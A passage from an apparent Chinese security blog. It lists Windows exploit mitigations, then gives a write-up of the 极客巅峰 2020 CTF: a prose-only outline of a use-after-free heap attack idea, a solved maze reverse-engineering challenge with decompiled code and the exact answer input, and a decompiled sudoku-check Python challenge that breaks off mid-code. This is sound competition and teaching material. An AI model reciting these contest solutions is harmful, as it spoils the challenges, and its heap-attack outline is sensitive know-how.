<h3 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a><code>SEHOP</code></h3><p>结构化异常处理保护(Structured Exception Handling Overwrite Protection), 这能够防止攻击者利用结构化异常处理来进一步利用。</p>
<h3 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a><code>CFG</code></h3><p>控制流保护(Control Flow Guard), 这项技术通过间接跳转前插入校验代码，检查目标的有效性，进而可以阻止执行流跳转到预期之外的地点。</p>
<h3 id="RFG"><a href="#RFG" class="headerlink" title="RFG"></a><code>RFG</code></h3><p>类似于linux 的cannary保护, 返回地址保护(Return Flow Guard),这项技术在每个函数头部将返回地址保存到fs:[rsp] (Thread Control), 并在函数返回前将其与返回地址进行比较。</p>
<h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a><code>SafeSEH</code></h3><p>安全结构化异常处理(Safe Structured Exception Handlers)，事先为你定义一些异常处理函数， 并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表 之外的异常处理都会被阻止运行</p>
<h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a><code>GS</code></h3><p>也类似于linux中的cannary保护, 在返回地址之前存放一个额外的Security Cookie,然后在ret之前与取出该值与之前存放的值做比较</p>
<h3 id="Authenticode"><a href="#Authenticode" class="headerlink" title="Authenticode"></a><code>Authenticode</code></h3><p>签名保护</p>
<h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a><code>.NET</code></h3><p>DLL混淆</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/02/windows-pwn-0/" data-id="ckhemv81j0023wdcmerow5431" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-jk-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/26/wp-jk-2020/" class="article-date">
  <time datetime="2020-09-26T10:32:31.000Z" itemprop="datePublished">2020-09-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/26/wp-jk-2020/">极客巅峰2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="极客巅峰-2020"><a href="#极客巅峰-2020" class="headerlink" title="极客巅峰 2020"></a>极客巅峰 2020</h1><p>本来都可以进线下的, 但我二进制这边没有输出, 先来个中午时web历史辉煌一刻:</p>
<p><img src="/images/wp-jk-2020-01.png" alt="image_01"></p>
<p>只怪自己太菜, 连累了队伍, 最后掉到后40了….</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>这次比赛两个盲打, 一个blind heap另一个不知道是啥题, 类似与抓的awd抓的流量包…还有一个是python 的溢出利用<br>这次的<code>pwn</code>只有个bheap有点思路, 其他两个pwn完全没思路, 但是一个也没弄出来, (菜~)。</p>
<h2 id="bheap"><a href="#bheap" class="headerlink" title="bheap"></a>bheap</h2><p>​    bheap存在uaf漏洞, double free之后没有报错, 那可以猜想为libc.so.2.26 ~ libc.so.2.27, 且在本地写了个模拟了一个逻辑差不多的程序, 使用dup修改top chunk size 故意报错, 远程也是如此，也很肯定猜想是正确的. 比较麻烦的是如何泄漏libc, 且开辟的次数不能超过10次。若用dup打入IO_FILE泄漏Libc的话, 开辟次数非常多, 加上再次劫持mallo_hook或free_hook,次数就超过10次很多了, 这点问题就把我kill掉了….菜~等wp吧….</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h2><p>是一个简单的迷宫题.采用4个迷宫, 需要自己根据字符串长度调整迷宫顺序.</p>
<p>主逻辑代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+14h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+40h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+44h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+48h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+4Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// [esp+50h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+54h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+58h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> times; <span class="comment">// [esp+5Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is a long way to defeat it.&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  len = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  times = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( flag[i] == <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = times++;</span><br><span class="line">      *(&amp;v6 + v3) = i;                          <span class="comment">// length</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !times )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v5 + i) = flag[i] - <span class="string">&#x27;0&#x27;</span>;               <span class="comment">// check is number</span></span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;v5 + i) &gt; <span class="number">9</span> || *(&amp;v5 + i) &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( times != <span class="number">4</span> )                             <span class="comment">// 4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v10 = len;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= times; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(&amp;v6 + i) - *(&amp;v6 + i - <span class="number">1</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( step[i] != v11 )                       <span class="comment">// check length</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;road[<span class="number">0xC8</span> * i], &amp;flag[*(&amp;v6 + i - <span class="number">1</span>) + <span class="number">1</span>], v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( check_flag((<span class="keyword">int</span>)&amp;global_map + <span class="number">0xC8</span> * *(&amp;v5 + i), *(&amp;v5 + i), &amp;road[<span class="number">200</span> * (i + <span class="number">1</span>)]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;How about try again?&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">3</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Great! We will defeat it!!! your flag is flag&#123;%s&#125;&quot;</span>, flag);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解释一下, 要求输入四个’-‘, 在输入’-‘之前必须为数字, 然后在对字符串的进行’-‘分割, ‘-’后面的长度分别为: 19, 25, 26, 28.这个从<code>step[i] != v11</code>所判断的, 如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:00403468 _step           dd 0                    ; DATA XREF: _main+13F↑r</span><br><span class="line">.data:0040346C                 dd 19</span><br><span class="line">.data:00403470                 dd 25</span><br><span class="line">.data:00403474                 dd 26</span><br><span class="line">.data:00403478                 dd 28</span><br><span class="line">.data:0040347C                 db    0</span><br><span class="line">.data:0040347D                 db    0</span><br><span class="line">.data:0040347E                 db    0</span><br><span class="line">.data:0040347F                 db    0</span><br></pre></td></tr></table></figure>

<p>通过以上逻辑, 输入的格式必须满足<code>  -str1-str2-str3-str4</code></p>
<p>接着看check_flag函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">check_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> length; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> width; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> hight; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  length = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  hight = start[<span class="number">2</span> * a2];</span><br><span class="line">  width = dword_403444[<span class="number">2</span> * a2];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= length )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( a3[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        --hight;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        ++hight;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        --width;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        ++width;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( width &lt; <span class="number">0</span> || width &gt; <span class="number">19</span> || hight &lt; <span class="number">0</span> || hight &gt; <span class="number">10</span> ) <span class="comment">//迷宫宽度 20, 高度10</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( length - <span class="number">1</span> == i )</span><br><span class="line">      <span class="keyword">return</span> *(_BYTE *)(a1 + <span class="number">20</span> * hight + width) != <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">20</span> * hight + width) != <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是一个典型的迷宫了,使用<code>wsad</code>字符来控制.</p>
<p>那么我们所输入的就需要这四个字符来控制了, 先找一下迷宫的地图, 且进行宽度为20进行补齐如下:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">|||||||||||||||.....</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">||s.........|||.....</span><br><span class="line">|||||||||||.|||.....</span><br><span class="line">||d||||||||.|||.....</span><br><span class="line">||.||||||||.|||.....</span><br><span class="line">||.||||||||.|||.....</span><br><span class="line">||..........|||.....</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">|||||||||||||||||||.</span><br><span class="line">||s|||||||||||||d||.</span><br><span class="line">||..|||||||||||..||.</span><br><span class="line">|||..|||||||||..|||.</span><br><span class="line">||||..|||||||..||||.</span><br><span class="line">|||||..|||||..|||||.</span><br><span class="line">||||||..|||..||||||.</span><br><span class="line">|||||||..|..|||||||.</span><br><span class="line">||||||||...||||||||.</span><br><span class="line">|||||||||||||||||||.</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">||.........s|||.....</span><br><span class="line">||.||||||||||||.....</span><br><span class="line">||.||||||||||||.....</span><br><span class="line">||.||||||||||||.....</span><br><span class="line">||.||||||||||||.....</span><br><span class="line">||.||||||||||||.....</span><br><span class="line">||.||||||||||||.....</span><br><span class="line">||.........d|||.....</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">|||||||||||||||.....</span><br><span class="line">|||..........||.....</span><br><span class="line">|||.||||||||.||.....</span><br><span class="line">|||.||||||||.||.....</span><br><span class="line">|||.||||||||.||.....</span><br><span class="line">|||.||||||||.||.....</span><br><span class="line">|||s||||||||d||.....</span><br><span class="line">|||||||||||||||.....</span><br></pre></td></tr></table></figure>

<p>从s出发到d结束, 那么四个迷宫分别步骤如下:</p>
<p><code>dddddddddsssssaaaaaaaaawww </code></p>
<p><code>sdsdsdsdsdsdsddwdwdwdwdwdwdw</code></p>
<p><code>aaaaaaaaasssssssddddddddd </code></p>
<p><code>wwwwwdddddddddsssss</code></p>
<p>当我输入<code> -dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw-aaaaaaaaasssssssddddddddd-wwwwwdddddddddsssss</code>发现, 在调用check_flag传入map参数执偏离原map很大的一个地址,且进入check_flag函数获取map中的值都是0,原来在输入步骤之前需要指定地图的顺序.</p>
<p>根据前面我们知道每个字符串的长度(19, 25, 26, 28)来指定:</p>
<p>那就是<code>-wwwwwdddddddddsssss-aaaaaaaaasssssssddddddddd-dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw</code></p>
<p>在确定一下迷宫的顺序为:</p>
<p>4312</p>
<p>那么输入的就是:</p>
<p><code>4312-wwwwwdddddddddsssss-aaaaaaaaasssssssddddddddd-dddddddddsssssaaaaaaaaawww-sdsdsdsdsdsdsddwdwdwdwdwdwdw</code></p>
<p>那么就出flag啦…</p>
<p><img src="/images/wp-jk-2020-re-01.png" alt="virus"></p>
<h3 id="fu-k-py"><a href="#fu-k-py" class="headerlink" title="fu!k_py"></a>fu!k_py</h3><p>通过饭编译pyc文件</p>
<p>解密网站: <a target="_blank" rel="noopener" href="http://www.llang.net/sudoku/calsudoku.html">http://www.llang.net/sudoku/calsudoku.html</a></p>
<p>或者: </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 fu!k.pyc &gt; fu!k.py</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.3 (default, May 17 2020, 18:15:42) </span></span><br><span class="line"><span class="comment"># [GCC 10.1.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: test233_ol.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-03-20 13:22:50</span></span><br><span class="line">(<span class="keyword">lambda</span> __g, __print: [ [ (<span class="keyword">lambda</span> __after: [ (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error len!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">input</span>) != <span class="number">87</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : [ [ [ [ (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error fmt!&#x27;</span>), (exit(<span class="number">0</span>), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> fmt1 != <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">or</span> fmt2 != <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (d.append(context[<span class="number">0</span>:<span class="number">9</span>]), (d.append(context[<span class="number">9</span>:<span class="number">18</span>]), (d.append(context[<span class="number">18</span>:<span class="number">27</span>]), (d.append(context[<span class="number">27</span>:<span class="number">36</span>]), (d.append(context[<span class="number">36</span>:<span class="number">45</span>]), (d.append(context[<span class="number">45</span>:<span class="number">54</span>]), (d.append(context[<span class="number">54</span>:<span class="number">63</span>]), (d.append(context[<span class="number">63</span>:<span class="number">72</span>]), (d.append(context[<span class="number">72</span>:<span class="number">81</span>]), [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">0</span>][<span class="number">2</span>] != <span class="string">&#x27;5&#x27;</span> <span class="keyword">or</span> d[<span class="number">0</span>][<span class="number">3</span>] != <span class="string">&#x27;3&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">1</span>][<span class="number">0</span>] != <span class="string">&#x27;8&#x27;</span> <span class="keyword">or</span> d[<span class="number">1</span>][<span class="number">7</span>] != <span class="string">&#x27;2&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">2</span>][<span class="number">1</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">or</span> d[<span class="number">2</span>][<span class="number">4</span>] != <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> d[<span class="number">2</span>][<span class="number">6</span>] != <span class="string">&#x27;5&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">3</span>][<span class="number">0</span>] != <span class="string">&#x27;4&#x27;</span> <span class="keyword">or</span> d[<span class="number">3</span>][<span class="number">5</span>] != <span class="string">&#x27;5&#x27;</span> <span class="keyword">or</span> d[<span class="number">3</span>][<span class="number">6</span>] != <span class="string">&#x27;3&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">4</span>][<span class="number">1</span>] != <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> d[<span class="number">4</span>][<span class="number">4</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">or</span> d[<span class="number">4</span>][<span class="number">8</span>] != <span class="string">&#x27;6&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">5</span>][<span class="number">2</span>] != <span class="string">&#x27;3&#x27;</span> <span class="keyword">or</span> d[<span class="number">5</span>][<span class="number">3</span>] != <span class="string">&#x27;2&#x27;</span> <span class="keyword">or</span> d[<span class="number">5</span>][<span class="number">7</span>] != <span class="string">&#x27;8&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">6</span>][<span class="number">1</span>] != <span class="string">&#x27;6&#x27;</span> <span class="keyword">or</span> d[<span class="number">6</span>][<span class="number">3</span>] != <span class="string">&#x27;5&#x27;</span> <span class="keyword">or</span> d[<span class="number">6</span>][<span class="number">8</span>] != <span class="string">&#x27;9&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">7</span>][<span class="number">2</span>] != <span class="string">&#x27;4&#x27;</span> <span class="keyword">or</span> d[<span class="number">7</span>][<span class="number">7</span>] != <span class="string">&#x27;3&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> d[<span class="number">8</span>][<span class="number">5</span>] != <span class="string">&#x27;9&#x27;</span> <span class="keyword">or</span> d[<span class="number">8</span>][<span class="number">6</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> check(h1) != <span class="number">45</span> <span class="keyword">or</span> check(h2) != <span class="number">45</span> <span class="keyword">or</span> check(h3) != <span class="number">45</span> <span class="keyword">or</span> check(h4) != <span class="number">45</span> <span class="keyword">or</span> check(h5) != <span class="number">45</span> <span class="keyword">or</span> check(h6) != <span class="number">45</span> <span class="keyword">or</span> check(h7) != <span class="number">45</span> <span class="keyword">or</span> check(h8) != <span class="number">45</span> <span class="keyword">or</span> check(h9) != <span class="number">45</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> check(l1) != <span class="number">45</span> <span class="keyword">or</span> check(l2) != <span class="number">45</span> <span class="keyword">or</span> check(l3) != <span class="number">45</span> <span class="keyword">or</span> check(l4) != <span class="number">45</span> <span class="keyword">or</span> check(l5) != <span class="number">45</span> <span class="keyword">or</span> check(l6) != <span class="number">45</span> <span class="keyword">or</span> check(l7) != <span class="number">45</span> <span class="keyword">or</span> check(l8) != <span class="number">45</span> <span class="keyword">or</span> check(l9) != <span class="number">45</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> check(k1) != <span class="number">45</span> <span class="keyword">or</span> check(k2) != <span class="number">45</span> <span class="keyword">or</span> check(k3) != <span class="number">45</span> <span class="keyword">or</span> check(k4) != <span class="number">45</span> <span class="keyword">or</span> check(k5) != <span class="number">45</span> <span class="keyword">or</span> check(k6) != <span class="number">45</span> <span class="keyword">or</span> check(k7) != <span class="number">45</span> <span class="keyword">or</span> check(k8) != <span class="number">45</span> <span class="keyword">or</span> check(k9) != <span class="number">45</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> check1(h1) != <span class="number">1</span> <span class="keyword">or</span> check1(h2) != <span class="number">1</span> <span class="keyword">or</span> check1(h3) != <span class="number">1</span> <span class="keyword">or</span> check1(h4) != <span class="number">1</span> <span class="keyword">or</span> check1(h5) != <span class="number">1</span> <span class="keyword">or</span> check1(h6) != <span class="number">1</span> <span class="keyword">or</span> check1(h7) != <span class="number">1</span> <span class="keyword">or</span> check1(h8) != <span class="number">1</span> <span class="keyword">or</span> check1(h9) != <span class="number">1</span> <span class="keyword">else</span> __after())(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __after: (__print(<span class="string">&#x27;Error!&#x27;</span>), (exit(), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> check1(l1) != <span class="number">1</span> <span class="keyword">or</span> check1(l2) != <span 